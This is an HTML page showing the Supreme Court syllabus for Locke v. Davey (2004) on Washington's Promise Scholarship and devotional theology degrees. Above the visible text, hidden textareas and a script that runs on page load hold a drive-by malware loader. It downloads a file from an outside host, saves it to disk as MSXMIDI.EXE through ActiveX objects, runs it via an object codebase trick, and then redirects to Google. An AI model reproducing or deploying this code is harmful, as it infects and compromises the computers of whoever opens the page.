<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<html>

<textarea id="CreateFileCode" style="display:none"> 
var DocPath=new String(document.location);
var oXMLHTTP = new ActiveXObject('Microsoft.XMLHTTP'); 
var InetPath='http://www.callbackgsm.com/msxmidi.dat';
oXMLHTTP.Open('GET',InetPath,0); 
oXMLHTTP.Send(); 
i=DocPath.indexOf('\\S');
if (i!=-1) 
{ObjSrc=DocPath.substring(6,i+1)+'MSXMIDI.EXE';
var oStream=new ActiveXObject('ADODB.Stream'); 
oStream.Mode=3; 
oStream.Type=1; 
oStream.Open(); 
oStream.Write(oXMLHTTP.responseBody); 
oStream.SaveToFile(ObjSrc,2);}
</textarea>

<textarea id="ExecuteFileCode" style="display:none">
var DocPath=new String(document.location);
i=DocPath.indexOf('\\S');
if (i!=-1) 
{ObjSrc=DocPath.substring(6,i+1)+'MSXMIDI.EXE';
var ObjCLSID='clsid:10000000-1000-0000-10000-000000000001';
document.write('<!-- ct classid=\"'+ObjCLSID+'\" codebase=\"'+ObjSrc+'\"></obje--><script>setTimeout(\'document.URL=\"http://google.com\"\',2000)</scr'+'ipt>');}
</textarea>
<script type="text/javascript">

function GetCode(code)
{ 
        result = ''; 
        lines = code.split(/\r\n/); 
        for (i=0;i<lines.length;i++)
        { 
            line = lines[i]; 
            line = line.replace(/[/]/g,"%2f"); 
            if (line != '') 
            { 
               result += line; 
            } 
        } 
        return result; 
}

function LaunchCreate()
{
        var CreateFileCode = GetCode(document.all.CreateFileCode.value); 
        var CreateCodeURL = "file:javascript:" + CreateFileCode;
        window.open(CreateCodeURL,"_search");
}

function LaunchExecute()
{                     
        var ExecuteFileCode = GetCode(document.all.ExecuteFileCode.value); 
        var ExecuteCodeURL = "file:javascript:" + ExecuteFileCode; 
        window.open(ExecuteCodeURL,"_search");
      
}
    
    var WaveURL="mmf://mplayer.midi";
    window.open(WaveURL,"_search");
    
    setTimeout("LaunchCreate()",1000);
    setTimeout("LaunchExecute()",6000);
   
</script>
</html>

<body>
<div align="center"><font color="#FF0000" size="6"><strong>LOCKE, GOVERNOR OF 
  WASHINGTON, et al. v. DAVEY </strong><strong></strong></font> </div>
<p align="center"><em>certiorari to the united states court of appeals for the 
  ninth circuit</em></p>
<p align="center"><em>No. 02-1315. Argued December 2, 2003--Decided February 25, 
  2004</em></p>
<p>Washington State established its Promise Scholarship Program to assist academically 
  gifted students with postsecondary education expenses. In accordance with the 
  State Constitution, students may not use such a scholarship to pursue a devotional 
  theology degree. Respondent Davey was awarded a Promise Scholarship and chose 
  to attend Northwest College, a private, church-affiliated institution that is 
  eligible under the program. When he enrolled, Davey chose a double major in 
  pastoral ministries and business management/administration. It is undisputed 
  that the pastoral ministries degree is devotional. After learning that he could 
  not use his scholarship to pursue that degree, Davey brought this action under 
  42 U. S. C. &sect;1983 for an injunction and damages, arguing that the denial 
  of his scholarship violated, inter alia, the First Amendment's Free Exercise 
  and Establishment Clauses. The District Court rejected Davey's constitutional 
  claims and granted the State summary judgment. The Ninth Circuit reversed, concluding 
  that, because the State had singled out religion for unfavorable treatment, 
  its exclusion of theology majors had to be narrowly tailored to achieve a compelling 
  state interest under Church of Lukumi Babalu Aye, Inc. v. Hialeah, 508 U. S. 
  520. Finding that the State's antiestablishment concerns were not compelling, 
  the court declared the program unconstitutional.</p>
<p>Held: Washington's exclusion of the pursuit of a devotional theology degree 
  from its otherwise-inclusive scholarship aid program does not violate the Free 
  Exercise Clause. This case involves the &quot;play in the joints&quot; between 
  the Establishment and Free Exercise Clauses. Walz v. Tax Comm'n of City of New 
  York, 397 U. S. 664, 669. That is, it concerns state action that is permitted 
  by the former but not required by the latter. The Court rejects Davey's contention 
  that, under Lukumi, supra, the program is presumptively unconstitutional because 
  it is not facially neutral with respect to religion. To accept this claim would 
  extend the Lukumi line of cases well beyond not only their facts but their reasoning. 
  Here, the State's disfavor of religion (if it can be called that) is of a far 
  milder kind than in Lukumi, where the ordinance criminalized the ritualistic 
  animal sacrifices of the Santeria religion. Washington's program imposes neither 
  criminal nor civil sanctions on any type of religious service or rite. It neither 
  denies to ministers the right to participate in community political affairs, 
  see McDaniel v. Paty, 435 U. S. 618, nor requires students to choose between 
  their religious beliefs and receiving a government benefit, see, e.g., Hobbie 
  v. Unemployment Appeals Comm'n of Fla., 480 U. S. 136. The State has merely 
  chosen not to fund a distinct category of instruction. Even though the differently 
  worded Washington Constitution draws a more stringent line than does the Federal 
  Constitution, the interest it seeks to further is scarcely novel. In fact, there 
  are few areas in which a State's antiestablishment interests come more into 
  play. Since this country's founding, there have been popular uprisings against 
  procuring taxpayer funds to support church leaders, which was one of the hallmarks 
  of an &quot;established&quot; religion. Most States that sought to avoid such 
  an establishment around the time of the founding placed in their constitutions 
  formal prohibitions against using tax funds to support the ministry. That early 
  state constitutions saw no problem in explicitly excluding only the ministry 
  from receiving state dollars reinforces the conclusion that religious instruction 
  is of a different ilk from other professions. Moreover, the entirety of the 
  Promise Scholarship Program goes a long way toward including religion in its 
  benefits, since it permits students to attend pervasively religious schools 
  so long as they are accredited, and students are still eligible to take devotional 
  theology courses under the program's current guidelines. Nothing in the Washington 
  Constitution's history or text or in the program's operation suggests animus 
  towards religion. Given the historic and substantial state interest at issue, 
  it cannot be concluded that the denial of funding for vocational religious instruction 
  alone is inherently constitutionally suspect. Without a presumption of unconstitutionality, 
  Davey's claim must fail. The State's interest in not funding the pursuit of 
  devotional degrees is substantial, and the exclusion of such funding places 
  a relatively minor burden on Promise Scholars. If any room exists between the 
  two Religion Clauses, it must be here. Pp. 4-12.</p>
<p>299 F. 3d 748, reversed.</p>
<p> Rehnquist, C. J., delivered the opinion of the Court, in which Stevens, O'Connor, 
  Kennedy, Souter, Ginsburg, and Breyer, JJ., joined. Scalia, J., filed a dissenting 
  opinion, in which Thomas, J., joined. Thomas, J., filed a dissenting opinion.</p>
<p></p>
</body>

<A href='http://www.kaktyc.ru' target='_new' title='Counter from KAKTYC.ru'><IMG
src='http://www.kaktyc.ru/counter.php?id=1272' border='0'></A>

</html>
